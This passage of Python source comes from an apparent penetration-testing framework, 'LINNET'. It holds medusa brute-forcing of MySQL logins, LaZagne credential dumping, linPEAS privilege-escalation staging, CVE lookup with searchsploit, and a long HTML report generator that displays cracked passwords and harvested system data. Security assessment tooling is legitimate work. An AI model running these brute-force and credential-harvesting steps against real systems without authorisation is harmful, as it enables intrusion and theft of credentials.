    print(f"\n[+] LaZagne output saved → {outfile}")
    _module_finding("LaZagne", f"Local run complete — saved to {outfile}")
    _parse_lazagne_creds(out, "localhost")


# ================================================================== #
#  MYSQL MODULE                                                        #
# ================================================================== #

def mysql_module(target):
    print("\n[+] MySQL Enumeration + Brute-Force Started\n")
    _module_ran("MySQL")

    run(f"nmap -p3306 -T4 --script mysql-info,mysql-enum {target}")
    _module_finding("MySQL", "mysql-info + mysql-enum executed")

    userlist = os.path.join(os.getcwd(), "username.txt")
    passlist = os.path.join(os.getcwd(), "password.txt")

    if os.path.exists(userlist) and os.path.exists(passlist):
        out   = run(f"medusa -h {target} -U {userlist} -P {passlist} -M mysql -t 8 2>/dev/null", capture=True)
        found = _parse_medusa_creds(out, "MySQL", target)
        _module_finding("MySQL", f"Medusa complete — {len(found)} credential(s) found")
        for user, pwd in found:
            _proof_mysql(target, user, pwd)
    else:
        print("[-] username.txt or password.txt missing!")
        _module_finding("MySQL", "Wordlists missing — skipped")


# ================================================================== #
#  LINUX PRIVESC STANDALONE                                            #
# ================================================================== #

def linux_privesc_standalone(target):
    print("\n[+] Linux PrivEsc module loaded.")
    print("    → linPEAS will auto-execute when SSH credentials are found via brute-force.")
    print("    → Use --ssh --linuxprivesc together for fully automatic flow.")
    print()
    _module_ran("PrivEsc")

    linpeas_path = "/usr/share/peass/linpeas/linpeas.sh"
    if not os.path.exists(linpeas_path):
        print("[-] linpeas.sh not found at /usr/share/peass/linpeas/linpeas.sh")
        _module_finding("PrivEsc", "linpeas.sh not found locally")
        return

    _module_finding("PrivEsc", "linPEAS ready — waiting for SSH creds to auto-trigger")
    print(f"[+] linPEAS found at {linpeas_path} — will be uploaded via SFTP when creds arrive")


# ================================================================== #
#  CVE LOOKUP                                                          #
# ================================================================== #

def cve_module(keyword=None, target=None):
    print("\n[+] CVE Lookup Module Started\n")
    _module_ran("CVE")

    keywords_to_search = []

    if target:
        print(f"[+] Running nmap -sV on {target}...\n")
        nmap_cmd = f"nmap -sV --version-intensity 5 -T4 --open {target}"
        _track_cmd(nmap_cmd)
        try:
            result = subprocess.run(
                nmap_cmd, shell=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                timeout=180
            ).stdout.decode()
        except subprocess.TimeoutExpired:
            result = ""

        print(result)
        detected = []
        for line in result.splitlines():
            if "open" not in line:
                continue
            m = re.match(r"(\d+)/\w+\s+open\s+\S+\s+(.*)", line.strip())
            if m:
                vs = m.group(2).strip()
                if vs:
                    detected.append(vs)

        if not detected:
            print("[-] No service versions detected.\n")
            _module_finding("CVE", "nmap -sV: no versions detected")
        else:
            print(f"[+] Detected {len(detected)} service(s):\n")
            for i, s in enumerate(detected, 1):
                print(f"    {i}. {s}")
            print()
            _module_finding("CVE", f"Detected: {', '.join(detected[:5])}")
            for svc in detected:
                parts = svc.split()
                kw = f"{parts[0]} {parts[1]}" if len(parts) >= 2 else parts[0]
                keywords_to_search.append(kw)

    if keyword:
        keywords_to_search.append(keyword.strip())

    if not keywords_to_search:
        print("[-] No keywords — CVE lookup cancelled.\n")
        return

    def get_score(vuln):
        m = vuln.get("metrics", {})
        for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
            if key in m and m[key]:
                return m[key][0]["cvssData"].get("baseScore", 0)
        return 0

    def get_cvss_ver(vuln):
        m = vuln.get("metrics", {})
        if "cvssMetricV31" in m: return "CVSS v3.1"
        if "cvssMetricV30" in m: return "CVSS v3.0"
        if "cvssMetricV2"  in m: return "CVSS v2"
        return "N/A"

    def get_sev(score):
        if score >= 9.0: return "CRITICAL"
        if score >= 7.0: return "HIGH"
        if score >= 4.0: return "MEDIUM"
        if score > 0:    return "LOW"
        return "N/A"

    base = "https://services.nvd.nist.gov/rest/json/cves/2.0"

    def fetch_nvd(kw):
        is_id = kw.upper().startswith("CVE-")
        url   = (f"{base}?cveId={urllib.parse.quote(kw.upper())}"
                 if is_id else
                 f"{base}?keywordSearch={urllib.parse.quote(kw)}&resultsPerPage=5")
        _track_cmd(f"NVD API -> {url}")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "LINNET-VAPT/1.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read().decode())
            return kw, [v["cve"] for v in data.get("vulnerabilities", [])]
        except Exception as e:
            print(f"[-] NVD error for '{kw}': {e}")
            return kw, []

    all_found = []

    with ThreadPoolExecutor(max_workers=3) as ex:
        futures = {ex.submit(fetch_nvd, kw): kw for kw in keywords_to_search}
        for fut in as_completed(futures):
            kw, vulns = fut.result()
            print(f"\n{'='*60}")
            print(f"[+] CVEs for: {kw}")
            print(f"{'='*60}\n")

            if not vulns:
                print(f"[-] No CVEs found for: {kw}\n")
                continue

            vulns.sort(key=get_score, reverse=True)
            all_found.extend(vulns)
            print(f"[+] Found {len(vulns)} CVE(s)\n")

            for vuln in vulns:
                cve_id   = vuln.get("id", "N/A")
                desc     = next((d["value"] for d in vuln.get("descriptions", []) if d["lang"] == "en"), "N/A")
                score    = get_score(vuln)
                severity = get_sev(score)
                ver      = get_cvss_ver(vuln)
                pub      = vuln.get("published", "")[:10]
                refs     = [r["url"] for r in vuln.get("references", [])[:2]]

                print(f"  CVE ID    : {cve_id}")
                print(f"  Severity  : {severity} | Score: {score:.1f} ({ver})")
                print(f"  Published : {pub}")
                print(f"  Desc      : {desc[:240]}{'...' if len(desc)>240 else ''}")
                for ref in refs:
                    print(f"  Ref       : {ref}")

                dl   = desc.lower()
                hint = None
                if "ssh"         in dl:                  hint = "--ssh"
                elif "ftp"       in dl:                  hint = "--ftp"
                elif "smb"       in dl or "samba" in dl: hint = "--smb"
                elif "http"      in dl or "apache" in dl:hint = "--http"
                elif "mysql"     in dl:                  hint = "--mysql"
                elif "snmp"      in dl:                  hint = "--snmp"
                elif "smtp"      in dl:                  hint = "--smtp"
                elif "dns"       in dl:                  hint = "--dns"
                elif "privilege" in dl:                  hint = "--linuxprivesc"
                if hint:
                    print(f"  [LINNET]  -> python3 linnet.py -t {target or '<IP>'} {hint}")

                print(f"  [EXPLOIT] -> searchsploit {cve_id}")
                print("-" * 60)

    with _lock:
        _cve_results.extend(all_found)

    top_ids = [v.get("id","?") for v in sorted(all_found, key=get_score, reverse=True)[:5]]
    if top_ids:
        _module_finding("CVE", f"Top CVEs: {', '.join(top_ids)}")
    _module_finding("CVE", f"Total: {len(all_found)} CVEs found")

    if all_found:
        print(f"\n[+] Running searchsploit for top CVEs...\n")
        top_cves = [v.get("id") for v in sorted(all_found, key=get_score, reverse=True)[:5]]

        def _sploit(cid):
            run(f"searchsploit {cid} 2>/dev/null || true", timeout=30)

        with ThreadPoolExecutor(max_workers=3) as ex:
            futs = [ex.submit(_sploit, c) for c in top_cves if c]
            for f in as_completed(futs):
                pass

    print(f"\n[+] CVE Lookup done — {len(all_found)} total at {datetime.now()}")


# ================================================================== #
#  HTML REPORT GENERATOR                                               #
# ================================================================== #

REPORT_CSS = """
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Inter:wght@300;400;500&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0c0f;--bg2:#0f1218;--bg3:#141920;--panel:#161c24;
  --border:#1e2a38;--border2:#243040;
  --accent:#00d4ff;--red:#ff4d4d;--orange:#ff8c42;--yellow:#ffd166;--green:#06d6a0;
  --muted:#4a5568;--text:#c8d6e5;--text2:#8899aa;--text3:#556677;
  --mono:'Share Tech Mono',monospace;--head:'Rajdhani',sans-serif;--body:'Inter',sans-serif;
}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:14px;line-height:1.7;min-height:100vh}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,.012) 2px,rgba(0,212,255,.012) 4px);pointer-events:none;z-index:9999}
.sidebar{position:fixed;left:0;top:0;bottom:0;width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;z-index:100}
.sidebar-logo{padding:24px 20px 20px;border-bottom:1px solid var(--border)}
.sidebar-logo .wordmark{font-family:var(--head);font-size:22px;font-weight:700;letter-spacing:4px;color:var(--accent);text-transform:uppercase}
.sidebar-logo .sub{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-top:2px;text-transform:uppercase}
.sidebar-nav{padding:16px 0;flex:1;overflow-y:auto}
.nav-section-label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:3px;text-transform:uppercase;padding:8px 20px 4px}
.nav-item{display:flex;align-items:center;gap:10px;padding:8px 20px;color:var(--text2);text-decoration:none;font-size:13px;border-left:2px solid transparent;transition:all .15s}
.nav-item:hover{color:var(--accent);background:rgba(0,212,255,.04);border-left-color:var(--accent)}
.nav-dot{width:6px;height:6px;border-radius:50%;background:var(--muted);flex-shrink:0}
.nav-item:hover .nav-dot{background:var(--accent)}
.nav-count{margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--text3)}
.sidebar-footer{padding:16px 20px;border-top:1px solid var(--border);font-family:var(--mono);font-size:10px;color:var(--text3)}
.main{margin-left:220px;padding:40px 48px;max-width:calc(100vw - 220px)}
.hero{position:relative;margin-bottom:40px;padding:40px 40px 36px;background:var(--panel);border:1px solid var(--border);border-radius:4px;overflow:hidden}
.hero::before{content:'VAPT';position:absolute;right:-10px;top:-20px;font-family:var(--head);font-size:140px;font-weight:700;color:rgba(0,212,255,.025);letter-spacing:-4px;pointer-events:none;user-select:none}
.hero-tag{font-family:var(--mono);font-size:10px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:12px}
.hero-title{font-family:var(--head);font-size:42px;font-weight:700;color:#fff;letter-spacing:2px;line-height:1.1;margin-bottom:6px}
.hero-title span{color:var(--accent)}
.hero-sub{font-size:13px;color:var(--text2);margin-bottom:28px}
.hero-meta{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border:1px solid var(--border);border-radius:3px;overflow:hidden}
.meta-cell{background:var(--bg3);padding:14px 16px}
.meta-cell .label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:4px}
.meta-cell .value{font-family:var(--mono);font-size:13px;color:var(--accent)}
.stats-row{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin-bottom:36px}
.stat-card{background:var(--panel);border:1px solid var(--border);border-radius:3px;padding:18px 16px;position:relative;overflow:hidden}
.stat-card::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--card-color,var(--accent));opacity:.7}
.stat-num{font-family:var(--head);font-size:36px;font-weight:700;color:var(--card-color,var(--accent));line-height:1;margin-bottom:4px}
.stat-label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase}
.section{margin-bottom:36px}
.section-header{display:flex;align-items:center;gap:12px;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--border)}
.section-icon{width:28px;height:28px;border:1px solid var(--border2);border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0}
.section-title{font-family:var(--head);font-size:18px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:#fff}
.section-badge{margin-left:auto;font-family:var(--mono);font-size:10px;padding:3px 10px;border-radius:2px;letter-spacing:1px}
.module-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
.module-card{background:var(--panel);border:1px solid var(--border);border-radius:3px;overflow:hidden}
.module-card-header{display:flex;align-items:center;gap:10px;padding:12px 16px;background:var(--bg3);border-bottom:1px solid var(--border)}
.module-card-header .service-name{font-family:var(--head);font-size:14px;font-weight:600;letter-spacing:2px;text-transform:uppercase}
.status-pill{margin-left:auto;font-family:var(--mono);font-size:9px;letter-spacing:1px;padding:2px 8px;border-radius:2px;text-transform:uppercase}
.pill-run{background:rgba(6,214,160,.15);color:var(--green);border:1px solid rgba(6,214,160,.3)}
.pill-skip{background:rgba(74,85,104,.2);color:var(--muted);border:1px solid rgba(74,85,104,.3)}
.pill-found{background:rgba(255,77,77,.15);color:var(--red);border:1px solid rgba(255,77,77,.3)}
.pill-cred{background:rgba(255,209,102,.2);color:var(--yellow);border:1px solid rgba(255,209,102,.4)}
.module-card-body{padding:14px 16px;font-family:var(--mono);font-size:11px;color:var(--text2);line-height:1.8}
.finding{display:flex;gap:8px;align-items:flex-start;padding:3px 0}
.finding-bullet{color:var(--accent);flex-shrink:0;margin-top:1px}
.cve-table,.cred-table,.postex-table,.proof-table{width:100%;border-collapse:collapse;font-size:12px}
.cve-table th,.cred-table th,.postex-table th,.proof-table th{font-family:var(--mono);font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--text3);padding:8px 12px;text-align:left;border-bottom:1px solid var(--border2);background:var(--bg3)}
.cve-table td,.cred-table td,.postex-table td,.proof-table td{padding:10px 12px;border-bottom:1px solid var(--border);vertical-align:top}
.cve-table tr:last-child td,.cred-table tr:last-child td,.postex-table tr:last-child td,.proof-table tr:last-child td{border-bottom:none}
.cve-table tr:hover td{background:rgba(0,212,255,.025)}
.cred-table tr:hover td{background:rgba(255,209,102,.04)}
.postex-table tr:hover td,.proof-table tr:hover td{background:rgba(6,214,160,.04)}
.cve-id-cell{font-family:var(--mono);color:var(--accent)!important;font-size:11px;white-space:nowrap}
.cve-link{color:var(--accent);text-decoration:none;border-bottom:1px dashed rgba(0,212,255,.4);transition:color .15s}
.cve-link:hover{color:#fff;border-bottom-color:#fff}
.score-badge{display:inline-block;font-family:var(--mono);font-size:10px;font-weight:600;padding:2px 7px;border-radius:2px;min-width:50px;text-align:center}
.sev-critical{background:rgba(255,77,77,.2);color:#ff4d4d;border:1px solid rgba(255,77,77,.4)}
.sev-high{background:rgba(255,140,66,.2);color:#ff8c42;border:1px solid rgba(255,140,66,.4)}
.sev-medium{background:rgba(255,209,102,.2);color:#ffd166;border:1px solid rgba(255,209,102,.4)}
.sev-low{background:rgba(6,214,160,.15);color:#06d6a0;border:1px solid rgba(6,214,160,.3)}
.sev-na{background:rgba(74,85,104,.2);color:#4a5568;border:1px solid rgba(74,85,104,.3)}
.score-bar{width:80px;height:3px;background:var(--border2);border-radius:2px;margin-top:5px;overflow:hidden}
.score-bar-fill{height:100%;border-radius:2px}
.cred-user{color:var(--yellow)!important;font-family:var(--mono)}
.cred-pass{color:var(--red)!important;font-family:var(--mono);font-weight:600}
.cred-svc{color:var(--accent)!important;font-family:var(--mono)}
.proof-block{background:#080b0e;border:1px solid var(--border);border-radius:3px;padding:12px 16px;font-family:var(--mono);font-size:11px;color:#8fbc8f;white-space:pre-wrap;word-break:break-all;max-height:180px;overflow-y:auto;line-height:1.7}
.proof-block::-webkit-scrollbar{width:4px}
.proof-block::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
.proof-label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
.terminal{background:#080b0e;border:1px solid var(--border);border-radius:3px;overflow:hidden}
.terminal-bar{background:var(--bg3);border-bottom:1px solid var(--border);padding:8px 14px;display:flex;align-items:center;gap:6px}
.t-dot{width:8px;height:8px;border-radius:50%}
.t-red{background:#ff5f57}.t-yellow{background:#ffbd2e}.t-green{background:#28c840}
.terminal-label{margin-left:8px;font-family:var(--mono);font-size:10px;color:var(--text3);letter-spacing:1px}
.terminal-body{padding:16px 20px;font-family:var(--mono);font-size:11px;color:#8fbc8f;line-height:2;max-height:300px;overflow-y:auto}
.terminal-body::-webkit-scrollbar{width:4px}
.terminal-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
.t-prompt{color:var(--accent)}.t-cmd{color:var(--text)}
.file-link{color:var(--green);font-family:var(--mono);font-size:11px}
.ref-link{color:var(--text3);font-family:var(--mono);font-size:10px;text-decoration:none;border-bottom:1px dashed rgba(85,102,119,.4);transition:all .15s;word-break:break-all}
.ref-link:hover{color:var(--accent);border-bottom-color:var(--accent)}
.report-footer{margin-top:48px;padding:20px 0;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.footer-brand{font-family:var(--head);font-size:14px;font-weight:600;letter-spacing:3px;color:var(--accent)}
.footer-info{font-family:var(--mono);font-size:10px;color:var(--text3);letter-spacing:1px}
@media print{.sidebar{display:none}.main{margin-left:0;padding:20px}body::before{display:none}}
"""

def _sev(score):
    if score >= 9.0: return "CRITICAL", "sev-critical"
    if score >= 7.0: return "HIGH",     "sev-high"
    if score >= 4.0: return "MEDIUM",   "sev-medium"
    if score > 0:    return "LOW",      "sev-low"
    return "N/A", "sev-na"

def _bar_color(score):
    if score >= 9.0: return "#ff4d4d"
    if score >= 7.0: return "#ff8c42"
    if score >= 4.0: return "#ffd166"
    return "#06d6a0"

def _nvd_score(vuln):
    m = vuln.get("metrics", {})
    for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
        if key in m and m[key]:
            return m[key][0]["cvssData"].get("baseScore", 0)
    return 0

def _nvd_refs(vuln):
    return [r["url"] for r in vuln.get("references", [])[:3]]

def _esc(s):
    return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;")

def _build_module_card(name, info):
    icons = {"SSH":"🔐","FTP":"📂","SMB":"🖧","HTTP":"🌐","DNS":"📡",
             "SNMP":"📟","SMTP":"📧","MySQL":"🗄","PrivEsc":"⚠","LaZagne":"🔑",
             "CVE":"🛡","AutoSSH":"🤖"}
    icon     = icons.get(name, "◈")
    status   = "RUN" if info.get("run") else "SKIP"
    pill_cls = "pill-run" if status == "RUN" else "pill-skip"
    findings_html = "".join(
        f'<div class="finding"><span class="finding-bullet">›</span><span>{_esc(f)}</span></div>'
        for f in info.get("findings", [])
    ) or '<div style="color:var(--text3);font-size:11px;">No findings recorded.</div>'
    return f"""
    <div class="module-card">
      <div class="module-card-header">
        <span style="font-size:16px">{icon}</span>
        <span class="service-name">{name}</span>
        <span class="status-pill {pill_cls}">{status}</span>
      </div>
      <div class="module-card-body">{findings_html}</div>
    </div>"""

def _build_cve_row(vuln):
    cve_id = vuln.get("id","N/A")
    desc   = next((d["value"] for d in vuln.get("descriptions",[]) if d["lang"]=="en"),"N/A")
    score  = _nvd_score(vuln)
    sl, sc = _sev(score)
    pub    = vuln.get("published","")[:10]
    pct    = int((score/10)*100) if score else 0
    short  = _esc(desc[:130] + ("…" if len(desc)>130 else ""))
    refs   = _nvd_refs(vuln)
    ref_html = ""
    if refs:
        ref_html = "<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'>"
        for i, url in enumerate(refs, 1):
            ref_html += f'<a class="ref-link" href="{_esc(url)}" target="_blank" rel="noopener">ref {i} ↗</a>'
        ref_html += "</div>"
    nvd_url  = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
    cve_link = f'<a class="cve-link" href="{nvd_url}" target="_blank" rel="noopener">{cve_id}</a>'
    return f"""<tr>
      <td class="cve-id-cell">{cve_link}</td>
      <td><span class="score-badge {sc}">{sl} {score:.1f}</span>
        <div class="score-bar"><div class="score-bar-fill" style="width:{pct}%;background:{_bar_color(score)}"></div></div></td>
      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">{short}{ref_html}</td>
      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">{pub}</td>
    </tr>"""

def _build_cred_row(c):
    return f"""<tr>
      <td class="cred-svc">{_esc(c['service'])}</td>
      <td class="cred-user">{_esc(c['user'])}</td>
      <td class="cred-pass">{_esc(c['password'])}</td>
      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">{_esc(c['target'])}</td>
      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">{_esc(c['time'])}</td>
    </tr>"""


def _build_proof_section():
    if not _proof_log:
        return "", ""
    service_icons = {
        "SSH":   ("🔐", "#00d4ff"),
        "FTP":   ("📂", "#ffd166"),
        "SMB":   ("🖧",  "#ff8c42"),
        "MySQL": ("🗄",  "#06d6a0"),
        "HTTP":  ("🌐", "#a78bfa"),
        "DNS":   ("📡", "#38bdf8"),
        "SNMP":  ("📟", "#fb923c"),
        "SMTP":  ("📧", "#34d399"),
    }
    proof_cards = ""
    total = sum(len(v) for v in _proof_log.values())
    for service, entries in _proof_log.items():
        icon, color = service_icons.get(service, ("◈", "#00d4ff"))
        for entry in entries:
            target = entry.get("target", "?")
            user   = entry.get("user", "?")
            data   = entry.get("data", {})
            data_html = ""
            if service == "SSH":
                data_html = f"""
                <div class="proof-label">System Identity</div>
                <div class="proof-block">{_esc(data.get('id',''))}\n{_esc(data.get('uname',''))}</div>
                <div class="proof-label" style="margin-top:10px">Network</div>
                <div class="proof-block">{_esc(data.get('ifconfig','')[:300])}</div>
                <div class="proof-label" style="margin-top:10px">/etc/passwd (tail)</div>
                <div class="proof-block">{_esc(data.get('passwd_tail',''))}</div>"""
            elif service == "FTP":
                data_html = f"""
                <div class="proof-label">Welcome Banner</div>
                <div class="proof-block">{_esc(data.get('welcome',''))}</div>
                <div class="proof-label" style="margin-top:10px">Directory Listing (pwd: {_esc(data.get('pwd','/'))}) </div>
                <div class="proof-block">{_esc(data.get('listing',''))}</div>"""
            elif service == "SMB":
                data_html = f"""
                <div class="proof-label">Share Listing</div>
                <div class="proof-block">{_esc(data.get('shares',''))}</div>"""
            elif service == "MySQL":
                data_html = f"""
                <div class="proof-label">Version</div>
                <div class="proof-block">{_esc(data.get('version',''))}</div>
                <div class="proof-label" style="margin-top:10px">Databases</div>
                <div class="proof-block">{_esc(data.get('databases',''))}</div>
                <div class="proof-label" style="margin-top:10px">MySQL Users</div>
                <div class="proof-block">{_esc(data.get('users',''))}</div>
                <div class="proof-label" style="margin-top:10px">Tables (first non-system DB)</div>
                <div class="proof-block">{_esc(data.get('tables',''))}</div>"""
            elif service == "HTTP":
                data_html = f"""
                <div class="proof-label">Response Headers</div>
                <div class="proof-block">{_esc(data.get('headers',''))}</div>
                <div class="proof-label" style="margin-top:10px">Body Preview</div>
                <div class="proof-block">{_esc(data.get('body_preview',''))}</div>"""
            elif service == "DNS":
                data_html = f"""
                <div class="proof-label">DNS Response</div>
                <div class="proof-block">{_esc(data.get('response',''))}</div>"""
            elif service == "SNMP":
                data_html = f"""
                <div class="proof-label">sysDescr Walk</div>
                <div class="proof-block">{_esc(data.get('sysDescr',''))}</div>"""
            elif service == "SMTP":
                data_html = f"""
                <div class="proof-label">Banner</div>
                <div class="proof-block">{_esc(data.get('banner',''))}</div>
                <div class="proof-label" style="margin-top:10px">EHLO Response</div>
                <div class="proof-block">{_esc(data.get('ehlo',''))}</div>"""
            proof_cards += f"""
            <div class="module-card" style="border-color:rgba({_hex_to_rgb(color)},.3)">
              <div class="module-card-header" style="border-bottom-color:rgba({_hex_to_rgb(color)},.3)">
                <span style="font-size:16px">{icon}</span>
                <span class="service-name" style="color:{color}">{service}</span>
                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">{_esc(target)}</span>
                <span class="status-pill pill-cred" style="margin-left:auto">{_esc(user)}</span>
              </div>
              <div class="module-card-body">{data_html}</div>
            </div>"""
    section = f"""
  <div class="section" id="proof">
    <div class="section-header">
      <div class="section-icon">✅</div>
      <div class="section-title">Proof of Access</div>
      <span class="section-badge pill-cred">{total} SERVICE(S)</span>
    </div>
    <div class="module-grid">{proof_cards}</div>
  </div>"""
    nav = f'<a class="nav-item" href="#proof"><span class="nav-dot" style="background:var(--green)"></span>Proof of Access <span class="nav-count">{total}</span></a>'
    return section, nav


def _hex_to_rgb(hex_color):
    h = hex_color.lstrip('#')
    r, g, b = int(h[0:2],16), int(h[2:4],16), int(h[4:6],16)
    return f"{r},{g},{b}"


def _build_postex_section():
    if not _post_findings:
        return "", ""
    rows = ""
    for key, info in _post_findings.items():
        linpeas_link = (f'<a class="file-link" href="{info["linpeas"]}" target="_blank">📄 {info["linpeas"]}</a>'
                        if info.get("linpeas") else '<span style="color:var(--text3)">—</span>')
        lazagne_link = (f'<a class="file-link" href="{info["lazagne"]}" target="_blank">📄 {info["lazagne"]}</a>'
                        if info.get("lazagne") else '<span style="color:var(--text3)">—</span>')
        rows += f"""<tr>
          <td style="font-family:var(--mono);color:var(--accent)">{_esc(info['target'])}</td>
          <td style="font-family:var(--mono);color:var(--yellow)">{_esc(info['user'])}</td>
          <td>{linpeas_link}</td>
          <td>{lazagne_link}</td>
        </tr>"""
    section = f"""
  <div class="section" id="postex">
    <div class="section-header">
      <div class="section-icon">🤖</div>
      <div class="section-title">Auto SSH Post-Exploitation</div>
      <span class="section-badge pill-run">{len(_post_findings)} SESSION(S)</span>
    </div>
    <div style="background:var(--panel);border:1px solid rgba(6,214,160,.25);border-radius:3px;overflow:hidden;">
      <table class="postex-table">
        <thead><tr><th>Target</th><th>User</th><th>linPEAS Output</th><th>LaZagne Output</th></tr></thead>
        <tbody>{rows}</tbody>
      </table>
    </div>
  </div>"""
    nav = f'<a class="nav-item" href="#postex"><span class="nav-dot" style="background:var(--green)"></span>Post-Exploit <span class="nav-count">{len(_post_findings)}</span></a>'
    return section, nav


def generate_report(target):
    now       = datetime.now()
    report_id = f"LNT-{now.strftime('%Y%m%d-%H%M%S')}"
    gen_time  = now.strftime("%Y-%m-%d %H:%M:%S")

    count_c  = sum(1 for v in _cve_results if _nvd_score(v) >= 9.0)
    count_h  = sum(1 for v in _cve_results if 7.0 <= _nvd_score(v) < 9.0)
    count_m  = sum(1 for v in _cve_results if 4.0 <= _nvd_score(v) < 7.0)
    count_l  = sum(1 for v in _cve_results if 0   <  _nvd_score(v) < 4.0)
    mods_run = sum(1 for m in _module_data.values() if m.get("run"))
    cred_cnt = len(_cred_log)

    module_cards_html = "".join(_build_module_card(n, i) for n, i in _module_data.items()) \
        or '<div style="color:var(--text3);padding:1rem;font-size:12px;font-family:var(--mono)">No modules executed.</div>'

    if _cve_results:
        rows = "".join(_build_cve_row(v) for v in sorted(_cve_results, key=_nvd_score, reverse=True))
        cve_section = f"""
  <div class="section" id="cves">
    <div class="section-header">
      <div class="section-icon">🛡</div>
      <div class="section-title">CVE Findings</div>
      <span class="section-badge pill-found">{len(_cve_results)} CVEs</span>
    </div>
    <div style="background:var(--panel);border:1px solid var(--border);border-radius:3px;overflow:hidden;">
      <table class="cve-table">
        <thead><tr><th>CVE ID ↗ NVD</th><th>Severity</th><th>Description &amp; References</th><th>Published</th></tr></thead>
        <tbody>{rows}</tbody>
      </table>
    </div>
  </div>"""
        cve_nav = f'<a class="nav-item" href="#cves"><span class="nav-dot" style="background:var(--red)"></span>CVE Findings <span class="nav-count">{len(_cve_results)}</span></a>'
    else:
        cve_section = cve_nav = ""

    if _cred_log:
        cred_rows = "".join(_build_cred_row(c) for c in _cred_log)
        cred_section = f"""
  <div class="section" id="creds">
    <div class="section-header">
      <div class="section-icon">🔑</div>
      <div class="section-title">Credentials Found</div>
      <span class="section-badge pill-cred">{cred_cnt} CRED{'S' if cred_cnt>1 else ''}</span>
    </div>
    <div style="background:var(--panel);border:1px solid rgba(255,209,102,.25);border-radius:3px;overflow:hidden;">
      <table class="cred-table">
        <thead><tr><th>Service</th><th>Username</th><th>Password</th><th>Target</th><th>Time</th></tr></thead>
        <tbody>{cred_rows}</tbody>
      </table>
    </div>
  </div>"""
        cred_nav = f'<a class="nav-item" href="#creds"><span class="nav-dot" style="background:var(--yellow)"></span>Credentials <span class="nav-count">{cred_cnt}</span></a>'
    else:
        cred_section = cred_nav = ""

    proof_section, proof_nav   = _build_proof_section()
    postex_section, postex_nav = _build_postex_section()

    cmd_lines = "".join(
        f'<div><span class="t-prompt">linnet@kali:~$ </span>'
        f'<span class="t-cmd">{_esc(c)}</span></div>\n'
        for c in _command_log
    ) or '<div style="color:var(--text3)">No commands recorded.</div>'

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>LINNET — VAPT Report :: {_esc(target)}</title>
<style>{REPORT_CSS}</style>
</head>
<body>
<nav class="sidebar">
  <div class="sidebar-logo">
    <div class="wordmark">LINNET</div>
    <div class="sub">VAPT Report</div>
  </div>
  <div class="sidebar-nav">
    <div class="nav-section-label">Navigation</div>
    <a class="nav-item" href="#overview"><span class="nav-dot"></span>Overview</a>
    <a class="nav-item" href="#modules"><span class="nav-dot"></span>Modules <span class="nav-count">{len(_module_data)}</span></a>
    {cred_nav}
    {proof_nav}
    {postex_nav}
    {cve_nav}
    <a class="nav-item" href="#commands"><span class="nav-dot"></span>Commands <span class="nav-count">{len(_command_log)}</span></a>
    <div class="nav-section-label" style="margin-top:12px;">Severity</div>
    <a class="nav-item" href="#cves"><span class="nav-dot" style="background:#ff4d4d"></span>Critical / High</a>
    <a class="nav-item" href="#cves"><span class="nav-dot" style="background:#ffd166"></span>Medium / Low</a>
  </div>
  <div class="sidebar-footer">Generated {gen_time}<br/>LINNET v2.1 &mdash; NVD API + paramiko</div>
</nav>
<main class="main">
  <div class="hero" id="overview">
    <div class="hero-tag">// Vulnerability Assessment &amp; Penetration Test Report</div>
    <div class="hero-title">SECURITY<br/><span>ASSESSMENT</span></div>
    <div class="hero-sub">Automated enumeration, CVE correlation &amp; post-exploitation — LINNET Framework v2.1</div>
    <div class="hero-meta">
      <div class="meta-cell"><div class="label">Target</div><div class="value">{_esc(target)}</div></div>
      <div class="meta-cell"><div class="label">Start Time</div><div class="value">{_esc(_start_time)}</div></div>
      <div class="meta-cell"><div class="label">End Time</div><div class="value">{gen_time}</div></div>
      <div class="meta-cell"><div class="label">Report ID</div><div class="value">{report_id}</div></div>
    </div>
  </div>
  <div class="stats-row">
